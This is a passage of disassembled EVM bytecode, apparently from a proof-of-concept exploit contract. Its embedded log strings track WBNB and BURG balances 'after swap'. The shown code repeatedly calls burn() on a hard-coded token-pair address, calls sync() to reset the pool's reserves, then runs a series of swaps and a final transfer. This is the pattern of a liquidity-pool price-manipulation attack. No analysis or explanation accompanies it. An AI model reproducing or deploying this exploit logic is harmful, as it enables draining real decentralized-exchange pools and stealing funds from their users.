DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1762 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x177F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x17A7 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x17DD PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1810 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x182D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1855 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x188B PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x18BE SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x18DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1903 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1939 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x196C SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1989 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x19B1 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x19E7 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1A1A SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1A37 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1A5F SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1A95 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1AC8 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1AE5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1B0D SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1B43 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1B76 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1B93 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1BBB SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1BF1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C47 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1C6B SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1CC2 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x27 SWAP1 DUP3 ADD MSTORE PUSH32 0x57424E422042616C616E6365206F6620636F6E74726163742061667465722073 PUSH1 0x60 DUP3 ADD MSTORE PUSH7 0x3BB0B839971717 PUSH1 0xC9 SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x1CEC JUMPI PUSH2 0x1CEC PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 SWAP1 DUP2 MUL SWAP2 SWAP1 SWAP2 ADD DUP2 ADD MLOAD PUSH1 0x40 DUP1 MLOAD DUP2 DUP2 MSTORE SWAP1 DUP2 ADD DUP4 SWAP1 MSTORE PUSH32 0x486F77206D7563682049206E65656420666F7220616E6F746865722073776170 PUSH1 0x60 DUP3 ADD MSTORE SWAP2 DUP3 ADD MSTORE PUSH1 0x80 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 JUMPDEST PUSH1 0x8D DUP2 LT ISZERO PUSH2 0x1DDA JUMPI PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2770A7EB PUSH1 0xE2 SHL DUP2 MSTORE PUSH20 0x2B0551B656509754285EEC81EE894338E14C5DD PUSH1 0x4 DUP3 ADD MSTORE PUSH10 0x43C25E0DCC1BD1C0000 PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x9DC29FAC SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1DAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1DC3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP1 DUP1 PUSH2 0x1DD2 SWAP1 PUSH2 0x2E3A JUMP JUMPDEST SWAP2 POP POP PUSH2 0x1D3D JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH20 0x2B0551B656509754285EEC81EE894338E14C5DD PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1E45 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1E69 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1EB0 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x1C SWAP1 DUP3 ADD MSTORE PUSH32 0x425552472062616C616E6365206F66205061636B616765207061697200000000 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH20 0x2B0551B656509754285EEC81EE894338E14C5DD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xFFF6CAE9 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1F07 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1F1B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x1F53 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x1F87 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x1FBB PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x1FEF PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x2023 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x2057 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x208B PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x20BF PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x20F3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x2127 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x215B PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x218F PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x21C3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x21F7 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x222B PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x225F PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x2293 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x22C7 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x22FB PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH2 0x2391 SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2365 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2389 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x23E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x240B SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x245E SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x23 SWAP1 DUP3 ADD MSTORE PUSH32 0x425552472062616C616E6365206F6620636F6E74726163742061667465722073 PUSH1 0x60 DUP3 ADD MSTORE PUSH3 0x77617 PUSH1 0xEC SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 PUSH2 0x3E5 PUSH2 0x2476 DUP7 PUSH1 0x3 PUSH2 0x2E53 JUMP JUMPDEST PUSH2 0x2480 SWAP2 SWAP1 PUSH2 0x2E72 JUMP JUMPDEST PUSH2 0x248B SWAP1 PUSH1 0x1 PUSH2 0x2E94 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x2499 DUP3 DUP8 PUSH2 0x2E94 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP11 DUP2 AND 